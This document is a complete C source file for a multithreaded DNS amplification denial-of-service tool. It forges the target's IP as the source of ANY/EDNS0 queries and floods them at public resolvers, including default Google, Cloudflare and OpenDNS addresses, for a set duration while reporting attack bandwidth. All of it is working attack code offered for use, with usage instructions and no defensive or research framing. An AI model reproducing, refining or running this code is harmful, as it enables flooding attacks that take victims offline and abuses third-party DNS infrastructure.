/*
 * ╔═══════════════════════════════════════════════════════════════════╗
 * ║           DNS AMPLIFICATION - WORKING VERSION                     ║
 * ║     Véritable amplification DNS avec IP spoofing                  ║
 * ╚═══════════════════════════════════════════════════════════════════╝
 * 
 * gcc dns.c -o dns -pthread -O3 -march=native -Wall
 * sudo ./dns <target_ip> <duration> <threads> [resolvers.txt]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sched.h>
#include <stdatomic.h>
#include <signal.h>

// ============================================================================
// CONFIGURATION
// ============================================================================

#define MAX_THREADS 500
#define MAX_RESOLVERS 100000
#define BATCH_SIZE 100
#define USLEEP_INTERVAL 50

// ============================================================================
// STRUCTURES
// ============================================================================

typedef struct {
    char ip[64];
    int amp_factor;
} Resolver;

typedef struct {
    char *target_ip;
    time_t end_time;
    int thread_id;
    
    Resolver *resolvers;
    int resolver_count;
    
    unsigned long local_packets;
    unsigned long local_bytes;
    
    _Atomic unsigned long *total_packets;
    _Atomic unsigned long *total_bytes;
    _Atomic int *stop;
} ThreadData;

// ============================================================================
// GLOBALS
// ============================================================================

static Resolver *g_resolvers = NULL;
static int g_resolver_count = 0;

static _Atomic unsigned long g_total_packets = 0;
static _Atomic unsigned long g_total_bytes = 0;
static _Atomic int g_stop = 0;

// Domaines pour amplification
static const char *AMP_DOMAINS[] = {
    "isc.org",
    "ripe.net",
    "google.com",
    "cloudflare.com",
    "facebook.com",
    "amazon.com",
    "microsoft.com",
    "apple.com",
};

#define NUM_DOMAINS (sizeof(AMP_DOMAINS) / sizeof(AMP_DOMAINS[0]))

// ============================================================================
// DNS STRUCTURES
// ============================================================================

struct dnshdr {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} __attribute__((packed));

// ============================================================================
// CHECKSUM
// ============================================================================

uint16_t checksum(void *b, int len) {
    uint16_t *buf = b;
    uint32_t sum = 0;
    
    for (; len > 1; len -= 2)
        sum += *buf++;
    
    if (len == 1)
        sum += *(uint8_t*)buf;
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return (uint16_t)~sum;
}

// ============================================================================
// BUILD DNS QUERY
// ============================================================================

int build_dns_query(uint8_t *buf, const char *domain) {
    struct dnshdr *dns = (struct dnshdr*)buf;
    
    dns->id = htons(rand());
    dns->flags = htons(0x0100);     // Standard query
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = htons(1);        // EDNS0
    
    uint8_t *qname = buf + sizeof(struct dnshdr);
    int pos = 0;
    
    // Encode domain
    const char *p = domain;
    while (*p) {
        const char *dot = strchr(p, '.');
        int len = dot ? (dot - p) : strlen(p);
        
        qname[pos++] = len;
        memcpy(qname + pos, p, len);
        pos += len;
        
        if (!dot) break;
        p = dot + 1;
    }
    qname[pos++] = 0;
    
    // Type ANY (255), Class IN (1)
    *(uint16_t*)(qname + pos) = htons(255);
    pos += 2;
    *(uint16_t*)(qname + pos) = htons(1);
    pos += 2;
    
    // EDNS0 OPT
    qname[pos++] = 0;                   // Name
    *(uint16_t*)(qname + pos) = htons(41); // Type OPT
    pos += 2;
    *(uint16_t*)(qname + pos) = htons(4096); // UDP payload
    pos += 2;
    *(uint32_t*)(qname + pos) = 0;      // Extended RCODE
    pos += 4;
    *(uint16_t*)(qname + pos) = 0;      // RDLEN
    pos += 2;
    
    return sizeof(struct dnshdr) + pos;
}

// ============================================================================
// SEND SPOOFED DNS
// ============================================================================

int send_dns_packet(int sock, const char *target_ip, const char *resolver_ip,
                   const char *domain) {
    uint8_t packet[4096];
    memset(packet, 0, sizeof(packet));
    
    struct iphdr *iph = (struct iphdr*)packet;
    struct udphdr *udph = (struct udphdr*)(packet + sizeof(struct iphdr));
    uint8_t *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    // Build DNS query
    int dns_len = build_dns_query(data, domain);
    int udp_len = sizeof(struct udphdr) + dns_len;
    int total_len = sizeof(struct iphdr) + udp_len;
    
    // UDP header
    udph->source = htons(53);
    udph->dest = htons(53);
    udph->len = htons(udp_len);
    udph->check = 0;
    
    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(total_len);
    iph->id = htons(rand());
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(target_ip);      // SPOOFED
    iph->daddr = inet_addr(resolver_ip);
    
    iph->check = checksum(iph, sizeof(struct iphdr));
    
    // Pseudo header for UDP checksum
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t zero;
        uint8_t proto;
        uint16_t len;
    } __attribute__((packed)) pseudo;
    
    pseudo.src = iph->saddr;
    pseudo.dst = iph->daddr;
    pseudo.zero = 0;
    pseudo.proto = IPPROTO_UDP;
    pseudo.len = udph->len;
    
    uint8_t checksum_buf[4096];
    memcpy(checksum_buf, &pseudo, sizeof(pseudo));
    memcpy(checksum_buf + sizeof(pseudo), udph, udp_len);
    
    udph->check = checksum(checksum_buf, sizeof(pseudo) + udp_len);
    if (udph->check == 0)
        udph->check = 0xFFFF;
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = 0;
    dest.sin_addr.s_addr = inet_addr(resolver_ip);
    
    int sent = sendto(sock, packet, total_len, 0,
                     (struct sockaddr*)&dest, sizeof(dest));
    
    return sent > 0 ? total_len : 0;
}

// ============================================================================
// LOAD RESOLVERS
// ============================================================================

int load_resolvers(const char *filename) {
    FILE *f = fopen(filename, "r");
    if (!f) {
        fprintf(stderr, "[!] Cannot open: %s\n", filename);
        return 0;
    }
    
    g_resolvers = malloc(MAX_RESOLVERS * sizeof(Resolver));
    g_resolver_count = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), f) && g_resolver_count < MAX_RESOLVERS) {
        line[strcspn(line, "\r\n")] = 0;
        
        char ip[64];
        int factor = 4000;  // Default
        
        if (sscanf(line, "%s %d", ip, &factor) >= 1) {
            strcpy(g_resolvers[g_resolver_count].ip, ip);
            g_resolvers[g_resolver_count].amp_factor = factor;
            g_resolver_count++;
        }
    }
    
    fclose(f);
    printf("[+] Loaded %d resolvers\n", g_resolver_count);
    return g_resolver_count;
}

// ============================================================================
// DEFAULT RESOLVERS
// ============================================================================

void load_defaults(void) {
    const char *dns[] = {
        "8.8.8.8",
        "8.8.4.4",
        "1.1.1.1",
        "1.0.0.1",
        "208.67.222.222",
        "208.67.220.220",
    };
    
    int n = sizeof(dns) / sizeof(dns[0]);
    g_resolvers = malloc(n * sizeof(Resolver));
    g_resolver_count = 0;
    
    for (int i = 0; i < n; i++) {
        strcpy(g_resolvers[g_resolver_count].ip, dns[i]);
        g_resolvers[g_resolver_count].amp_factor = 3000;
        g_resolver_count++;
    }
    
    printf("[+] Using %d default resolvers\n", g_resolver_count);
}

// ============================================================================
// SIGNAL HANDLER
// ============================================================================

void sig_handler(int sig) {
    (void)sig;
    atomic_store(&g_stop, 1);
}

// ============================================================================
// WORKER
// ============================================================================

void* worker(void *arg) {
    ThreadData *d = (ThreadData*)arg;
    
    // CPU affinity
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(d->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpu);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpu);
    
    // Raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "[!] Thread %d: socket failed (need root!)\n", d->thread_id);
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "[!] Thread %d: setsockopt failed\n", d->thread_id);
        close(sock);
        return NULL;
    }
    
    // Buffer
    int buf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    
    unsigned long cycle = 0;
    unsigned long sync = 0;
    
    printf("[+] Thread %d: Started with socket %d\n", d->thread_id, sock);
    
    // MAIN LOOP
    while (!atomic_load(&g_stop) && time(NULL) < d->end_time) {
        cycle++;
        
        // Pour chaque resolver
        for (int r = 0; r < d->resolver_count; r++) {
            
            // Batch
            for (int b = 0; b < BATCH_SIZE; b++) {
                const char *domain = AMP_DOMAINS[rand() % NUM_DOMAINS];
                
                int sent = send_dns_packet(sock, d->target_ip,
                                          d->resolvers[r].ip, domain);
                
                if (sent > 0) {
                    d->local_packets++;
                    // Estimation amplifiée
                    d->local_bytes += sent * (d->resolvers[r].amp_factor / 100);
                }
            }
        }
        
        // Sync stats
        if (++sync >= 100) {
            atomic_fetch_add(d->total_packets, d->local_packets);
            atomic_fetch_add(d->total_bytes, d->local_bytes);
            
            d->local_packets = 0;
            d->local_bytes = 0;
            sync = 0;
        }
        
        // CPU breathing
        if (cycle % 10 == 0) {
            usleep(USLEEP_INTERVAL);
        }
    }
    
    // Final sync
    atomic_fetch_add(d->total_packets, d->local_packets);
    atomic_fetch_add(d->total_bytes, d->local_bytes);
    
    close(sock);
    printf("[+] Thread %d: Stopped\n", d->thread_id);
    return NULL;
}

// ============================================================================
// MAIN
// ============================================================================

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("\n╔═══════════════════════════════════════════════════════════════════╗\n");
        printf("║           DNS AMPLIFICATION - WORKING VERSION                     ║\n");
        printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");
        printf("Usage: sudo %s <target_ip> <duration> <threads> [resolvers.txt]\n\n", argv[0]);
        printf("Resolvers format:\n");
        printf("  IP FACTOR\n");
        printf("  204.209.68.1 4061\n");
        printf("  148.245.84.42 3918\n\n");
        return 1;
    }
    
    if (geteuid() != 0) {
        fprintf(stderr, "[✗] Need root! Run: sudo %s ...\n", argv[0]);
        return 1;
    }
    
    const char *target = argv[1];
    int duration = atoi(argv[2]);
    int threads = atoi(argv[3]);
    
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    
    // Load resolvers
    if (argc >= 5) {
        if (load_resolvers(argv[4]) == 0) {
            load_defaults();
        }
    } else {
        load_defaults();
    }
    
    if (g_resolver_count == 0) {
        fprintf(stderr, "[✗] No resolvers!\n");
        return 1;
    }
    
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    
    printf("\n╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║              DNS AMPLIFICATION CONFIGURATION                       ║\n");
    printf("╠═══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Target:      %-52s ║\n", target);
    printf("║  Duration:    %-52d ║\n", duration);
    printf("║  Threads:     %-52d ║\n", threads);
    printf("║  Resolvers:   %-52d ║\n", g_resolver_count);
    printf("║  Batch:       %-52d ║\n", BATCH_SIZE);
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");
    
    srand(time(NULL));
    
    pthread_t *handles = malloc(threads * sizeof(pthread_t));
    
    printf("[*] Starting attack...\n\n");
    
    time_t start = time(NULL);
    time_t end = start + duration;
    
    // Create threads
    for (int i = 0; i < threads; i++) {
        ThreadData *d = malloc(sizeof(ThreadData));
        d->target_ip = (char*)target;
        d->end_time = end;
        d->thread_id = i;
        d->resolvers = g_resolvers;
        d->resolver_count = g_resolver_count;
        d->local_packets = 0;
        d->local_bytes = 0;
        d->total_packets = &g_total_packets;
        d->total_bytes = &g_total_bytes;
        d->stop = &g_stop;
        
        pthread_create(&handles[i], NULL, worker, d);
        usleep(5000);
    }
    
    unsigned long last_pkt = 0, last_bytes = 0;
    
    // Monitor
    while (time(NULL) < end && !atomic_load(&g_stop)) {
        sleep(2);
        
        unsigned long pkt = atomic_load(&g_total_packets);
        unsigned long bytes = atomic_load(&g_total_bytes);
        
        unsigned long pps = (pkt - last_pkt) / 2;
        double gbps = ((bytes - last_bytes) * 8.0) / 2000000000.0;
        
        last_pkt = pkt;
        last_bytes = bytes;
        
        printf("[⚡] %lu packets | %lu PPS | %.2f Gbps\n", pkt, pps, gbps);
    }
    
    atomic_store(&g_stop, 1);
    
    printf("\n[*] Stopping...\n");
    
    for (int i = 0; i < threads; i++) {
        pthread_join(handles[i], NULL);
    }
    
    int elapsed = (int)difftime(time(NULL), start);
    if (elapsed <= 0) elapsed = 1;
    
    unsigned long final_pkt = atomic_load(&g_total_packets);
    unsigned long final_bytes = atomic_load(&g_total_bytes);
    
    printf("\n╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    FINAL STATS                                     ║\n");
    printf("╠═══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Packets:     %-52lu ║\n", final_pkt);
    printf("║  Avg PPS:     %-52.0f ║\n", (double)final_pkt / elapsed);
    printf("║  Avg Gbps:    %-52.2f ║\n", ((double)final_bytes * 8.0) / (elapsed * 1e9));
    printf("║  Total:       %-49.2f GB ║\n", (double)final_bytes / 1e9);
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");
    
    free(g_resolvers);
    free(handles);
    
    return 0;
}
